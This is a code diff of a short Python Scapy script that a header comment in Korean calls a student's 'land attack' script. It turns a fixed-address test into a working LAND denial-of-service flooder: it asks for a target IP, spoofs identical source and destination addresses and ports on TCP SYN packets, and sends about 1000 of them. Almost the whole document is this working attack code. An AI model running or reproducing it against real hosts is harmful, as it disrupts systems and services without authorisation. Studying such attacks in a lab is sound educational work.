@@ -4,18 +4,20 @@
 
 #                                           김 진 학 생 land 공 격 문 작 성
 from scapy.all import *
-
+global Total
+Total=0
 if __name__ == '__main__':
-    Total = 0
+    print("주소를 입력하세요" ,end=" ")
+    attack_ip=input() # ip 주소를 입력하여 공격문을 준비
     
 
-    i = IP(src="172.30.1.4", dst="172.30.1.4") 
-    i.proto = 6
+    i = IP(src=attack_ip, dst=attack_ip)  #보낼 패킷을 입력한 주소와 함께 넣어준다
+    i.proto = 6 #프로토콜 종류를 지정
     tu = TCP()
-    tu = TCP(dport=9001, sport=9001, flags=0x002)
+    tu = TCP(dport=9001, sport=9001, flags=0x002)# 지정한 포트와 syn값을 tu 변수에 넣어준다.
     # tu.show()
 
-    for x in range(1, 10):
+    for x in range(1, 1000):#1000천개 정도의 패킷을 반복적으로 전송한다.
         Total += 1
         send(i / tu / "hello word")
         print("send packet:", Total)
